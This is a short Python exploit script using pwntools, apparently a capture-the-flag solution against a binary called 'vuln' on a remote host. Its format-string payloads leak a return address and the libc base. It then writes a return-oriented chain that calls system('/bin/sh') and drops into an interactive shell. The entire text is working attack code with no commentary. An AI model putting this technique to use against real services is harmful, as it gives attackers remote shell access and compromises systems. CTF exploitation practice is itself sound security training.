from pwn import *

context.log_level = 'error'

context.binary = elf = ELF("./vuln")
libc = ELF("./libc.so.6")
#conn = remote("localhost", 1337)
conn = remote("34.57.72.108", 42042)

conn.sendlineafter(b"Choice: ", b"s %82p%53$hhn") # select Rome
conn.recvuntil(b"0x")
ret = int(conn.recv(12), 16) + 0x1a8
info("retaddr @ " + hex(ret))
conn.sendlineafter(b"Choice: ", b"book") # trigger big fmtstr
# change ctr to 0 for 2nd pass
conn.sendlineafter(b"crash report here:\n", b"%9$n%10$s%64s%89$hhnaaaa" + p64(ret + 0x10) + p64(ret + 0x30))
conn.recvuntil(b":\n")
libc.address = u64(conn.recv(6) + b"\0\0") - 0x2a1ca
info("libc @ " + hex(libc.address))
conn.sendlineafter(b"Choice: ", b"s %82p%53$hhn") # select Rome
conn.sendlineafter(b"Choice: ", b"book") # trigger big fmtstr
# ropchain
rop = ROP(libc)
writes = {
    ret + 0: rop.find_gadget(["ret"])[0],
    ret + 8: rop.find_gadget(["pop rdi", "ret"])[0],
    ret + 16: next(libc.search(b"/bin/sh\0")),
    ret + 24: libc.sym.system
}
#import sys
#x= int(sys.argv[1])
#conn.sendline(b"%7$sxxxx" + p64(ret+1+x*8))
#conn.recvuntil(b"management:\n")
#print(conn.recvuntil(b"xxxx")[:-4][:8].ljust(8, b'\0')[::-1].hex())
#exit()
#conn.interactive()
payload = fmtstr_payload(6, writes=writes, write_size="short")
conn.sendlineafter(b"crash report here:\n", payload)

conn.interactive()
